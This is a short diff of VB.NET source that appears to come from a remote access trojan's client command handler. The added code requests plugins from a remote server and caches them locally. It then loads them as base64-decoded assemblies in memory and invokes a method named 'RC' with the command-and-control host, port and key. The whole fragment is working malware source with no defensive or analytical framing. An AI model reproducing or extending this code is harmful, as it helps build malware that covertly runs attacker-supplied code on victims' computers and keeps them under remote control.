@@ -50,8 +50,16 @@ Public Class Commands
                         Installation.DEL()
                     End If
 
-                Case "Plugin"
-                    Plugin(Convert.FromBase64String(A(1)))
+                Case "CPL" 'check plugin
+                    If GTV(A(1)) = Nothing Then
+                        C.Send("GPL" + SPL + A(1))
+                    Else
+                        Plugin(Convert.FromBase64String(GTV(A(1))))
+                    End If
+
+                Case "IPL" 'invo plugin
+                    STV(A(2), A(1))
+                    Plugin(Convert.FromBase64String(GTV(A(2))))
 
             End Select
         Catch ex As Exception
@@ -64,7 +72,7 @@ Public Class Commands
         Try
             For Each A As Type In AppDomain.CurrentDomain.Load(B).GetTypes
                 For Each MF In A.GetMethods
-                    If MF.Name = BS(New Byte() {82, 67}) Then
+                    If MF.Name = BS(New Byte() {82, 67}) Then 'RC
                         MF.Invoke(Nothing, New Object() {Settings.HOST, Settings.PORT, TCP.KEY})
                     End If
                 Next
